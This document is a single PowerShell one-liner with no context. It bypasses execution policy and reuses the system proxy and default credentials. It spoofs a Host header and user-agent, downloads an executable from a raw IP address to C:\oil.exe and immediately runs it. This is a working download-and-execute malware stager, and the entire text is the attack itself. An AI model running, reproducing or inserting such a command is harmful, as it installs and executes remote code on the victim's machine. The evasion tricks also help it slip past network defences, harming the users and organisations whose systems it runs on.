powershell -exec bypass -c
$u="http://198.23.212.192/inv/oil.exe";
$p=[System.Net.WebRequest]::GetSystemWebProxy();
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
$w=New-Object net.webclient;
$w.Headers.add('Host','www.0hak.com')
$w.Headers.add('user-agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;')
$w.proxy=$p;
$w.UseDefaultCredentials=$true;
$s=$w.DownloadFile($u,"C:\oil.exe");Start-Process "C:\oil.exe";
